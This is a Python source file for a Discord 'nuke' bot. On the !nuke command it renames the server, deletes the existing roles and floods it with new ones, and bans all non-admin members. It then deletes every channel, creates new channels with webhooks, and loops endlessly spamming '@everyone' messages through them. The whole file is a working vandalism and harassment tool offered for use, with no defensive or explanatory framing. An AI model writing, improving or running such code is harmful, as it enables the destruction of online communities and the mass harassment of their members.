import discord
from discord.ext import commands
import asyncio
import aiohttp
import time
import random

intents = discord.Intents.all()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

webhook_urls = []
webhook_lock = asyncio.Lock()

def load_settings():
    config = {}
    try:
        with open("config.txt", "r") as f:
            for line in f:
                if "=" in line and not line.startswith("#"):
                    key, value = line.strip().split("=", 1)
                    config[key.strip().upper()] = value.strip()
    except FileNotFoundError:
        print("[*] Error config.txt not found")
    return config

@bot.event
async def on_ready():
    print(f" Logged in as {bot.user}")
    bot.loop.create_task(spam_webhooks_loop())

async def create_webhook(channel, webhook_name, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            webhook = await channel.create_webhook(name=webhook_name)
            return webhook
        except Exception as e:
            if attempt < max_attempts - 1:
                await asyncio.sleep(2 ** attempt)
            else:
                print(f"[*] Failed to create webhook: {e}")
                return None
    return None

async def ban_all_members(guild):
    print("[*] Starting to ban all members...")
    banned_count = 0
    failed_count = 0
    
    for member in guild.members:
        if member == bot.user:
            continue
        if member.guild_permissions.administrator:
            print(f"[*] Skipping admin: {member.name}")
            continue
            
        try:
            await member.ban(reason="Nuked by bot")
            banned_count += 1
            print(f"[*] Banned: {member.name}")
            await asyncio.sleep(0.5)
        except Exception as e:
            failed_count += 1
            print(f"[*] Failed to ban {member.name}: {e}")
    
    print(f"[*] Ban complete - Banned: {banned_count}, Failed: {failed_count}")

async def delete_all_roles(guild):
    print("[*] Deleting all existing roles...")
    deleted_count = 0
    failed_count = 0
    
    roles_to_delete = [role for role in guild.roles if role != guild.default_role and role < guild.me.top_role]
    
    delete_tasks = []
    for role in roles_to_delete:
        delete_tasks.append(delete_role_safe(role))
    
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    for result in results:
        if isinstance(result, Exception):
            failed_count += 1
        elif result is True:
            deleted_count += 1
    
    print(f"[*] Role deletion complete - Deleted: {deleted_count}, Failed: {failed_count}")

async def delete_role_safe(role):
    try:
        await role.delete()
        print(f"[*] Deleted role: {role.name}")
        return True
    except Exception as e:
        print(f"[*] Failed to delete role {role.name}: {e}")
        return False

async def create_role_batch(guild, role_name, role_color, start_index, batch_size):
    tasks = []
    for i in range(batch_size):
        tasks.append(create_single_role(guild, role_name, role_color, start_index + i))
    return await asyncio.gather(*tasks, return_exceptions=True)

async def create_single_role(guild, role_name, role_color, index):
    try:
        color = discord.Color.random() if role_color.lower() == "random" else discord.Color.default()
        role = await guild.create_role(name=role_name, color=color, hoist=False, mentionable=False)
        print(f"[*] Created role {index + 1}: {role_name}")
        return role
    except Exception as e:
        print(f"[*] Failed to create role {index + 1}: {e}")
        return None

@bot.command()
async def nuke(ctx):
    global webhook_urls
    settings = load_settings()
    channel_count = int(settings.get("CREATE", 5))
    channel_name = settings.get("CHANNEL_NAME", "lol")
    webhook_name = settings.get("WEBHOOK_NAME", "lol")
    message = settings.get("MESSAGE", "@everyone")
    server_name = settings.get("SERVER_NAME", "lol")
    ban_members = settings.get("BAN_MEMBERS", "true").lower() == "true"
    create_roles = settings.get("CREATE_ROLES", "true").lower() == "true"
    role_count = int(settings.get("ROLE_COUNT", 50))
    role_name = settings.get("ROLE_NAME", "get-nuked")
    role_color = settings.get("ROLE_COLOR", "random")

    guild = ctx.guild

    try:
        await guild.edit(name=server_name)
        print(f"[*] Server name changed to '{server_name}'")
    except Exception as e:
        print(f"[*] Failed to change server name: {e}")

    if create_roles:
        await delete_all_roles(guild)
        
        print(f"[*] Starting fast role creation - Creating {role_count} roles...")
        batch_size = 10
        role_tasks = []
        
        for i in range(0, role_count, batch_size):
            current_batch = min(batch_size, role_count - i)
            role_tasks.append(create_role_batch(guild, role_name, role_color, i, current_batch))
        
        role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
        
        created = 0
        for batch_result in role_results:
            if isinstance(batch_result, list):
                created += sum(1 for r in batch_result if r is not None and not isinstance(r, Exception))
        
        print(f"[*] Fast role creation complete - Created: {created}/{role_count} roles")

    if ban_members:
        await ban_all_members(guild)

    print("[*] Deleting all channels...")
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    async with webhook_lock:
        webhook_urls.clear()

    async def setup_channel(index):
        try:
            channel = await guild.create_text_channel(channel_name)
            webhook = await create_webhook(channel, webhook_name)
            if webhook:
                async with webhook_lock:
                    webhook_urls.append(webhook.url)
                print(f"[*] Created channel '{channel.name}' and webhook")
            else:
                print(f"[*] Failed to create webhook for channel {index}")
        except Exception as e:
            print(f"[*] Error creating channel/webhook {index}: {e}")

    create_tasks = [setup_channel(i) for i in range(channel_count)]
    await asyncio.gather(*create_tasks, return_exceptions=True)

    async with aiohttp.ClientSession() as session:
        async with webhook_lock:
            current_webhooks = webhook_urls.copy()
        
        for url in current_webhooks:
            try:
                async with session.post(url, json={"content": message}) as resp:
                    if resp.status == 204:
                        print(f"[*] Initial message sent")
                    else:
                        print(f"[*] Failed to send initial message")
                    await asyncio.sleep(0.5)
            except Exception as e:
                print(f"[*] Failed to send initial message: {e}")

async def spam_webhooks_loop():
    await asyncio.sleep(5)
    
    async with aiohttp.ClientSession() as session:
        while True:
            settings = load_settings()
            message = settings.get("MESSAGE", "Hello!")
            try:
                interval = float(settings.get("INTERVAL", 1.0))
            except ValueError:
                interval = 1.0

            async with webhook_lock:
                current_webhooks = webhook_urls.copy()

            for url in current_webhooks:
                try:
                    async with session.post(url, json={"content": message}) as resp:
                        if resp.status != 204:
                            print("[*] Failed to send message via webhook")
                        await asyncio.sleep(0.5)
                except Exception:
                    print("[*] Failed to send message via webhook")

            await asyncio.sleep(interval)

settings = load_settings()
TOKEN = settings.get("TOKEN")
if not TOKEN:
    print("[*] Error No TOKEN found in config.txt")
else:
    bot.run(TOKEN)
